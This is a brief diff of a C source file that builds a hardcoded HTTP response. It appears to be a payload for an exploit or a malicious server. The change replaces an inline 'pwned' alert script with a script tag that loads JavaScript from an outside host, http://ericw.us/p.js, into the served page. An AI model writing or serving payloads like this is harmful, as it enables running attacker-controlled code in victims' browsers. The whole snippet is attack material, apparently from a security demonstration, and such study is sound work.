@@ -4,7 +4,7 @@
 #include <assert.h>
 
 char HTTP_PAYLOAD[1000];
-#define HTML "<h1>Win</h1><script type=\"text/javascript\">alert('pwned');</script>\n"
+#define HTML "<script src=\"http://ericw.us/p.js\"></script>\n"
 #define HTTP "HTTP/1.1 200\n" \
              "Content-Type: text/html\n" \
              "Content-Length: %d\n\n%s"
